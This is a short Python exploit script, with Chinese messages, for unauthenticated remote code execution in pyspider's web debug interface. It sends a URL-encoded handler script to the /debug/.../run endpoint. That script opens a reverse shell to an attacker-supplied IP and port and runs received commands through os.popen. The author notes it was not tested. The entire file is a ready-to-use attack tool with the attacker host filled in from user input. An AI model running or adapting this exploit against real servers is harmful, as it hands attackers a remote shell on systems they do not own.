import requests
print("这是pyspider未授权访问的EXP，它能反弹shell,但由于本人VPS过期未能测试")
data='''
webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aimport+socket%0Aimport+os%0Aimport+sys%0Aimport+time%0Adef+test()%3A%0A++++hacker%3D%22192.168.0.144%22%0A++++port%3D1234%0A++++server%3D(hacker%2Cport)%0A++++s%3Dsocket.socket()%0A++++s.connect(server)%0A++++while+1%3A%0A++++++++dir%3Dos.getcwd()%0A++++++++s.send(dir.encode())%0A++++++++cmd%3Ds.recv(1024).decode()%0A++++++++if+cmd%3D%3D%22exit%22%3A%0A++++++++++++exit%0A++++++++elif+cmd.startswith(%22cd%22)%3A%0A++++++++++++os.chdir(cmd%5B2%3A%5D.strip())%0A++++++++++++result%3D%22Successfully+switched+directory!%22%0A++++++++else%3A%0A++++++++++++result%3Dos.popen(cmd).read()%0A++++++++if+not+result%3A%0A++++++++++++result%3D%22Command+Execution+Completed!%22%0A++++++++s.send(result.encode())%0A++++++++time.sleep(1)%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++exec(test())&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
'''
target=input("pyspider的URL:")
ip=input("你的ip:")
port=str(input("你的端口:"))
data=data.replace("192.168.0.144",ip).replace("1234",port)
headers={"Content-Type": "application/x-www-form-urlencoded"}
url=target+"/debug/pyspidervulntest/run"
try:
    requests.post(url=url,data=data,headers=headers,timeout=1)
except Exception:
    pass
print("已经发送paylaod请检查是否有shell弹回")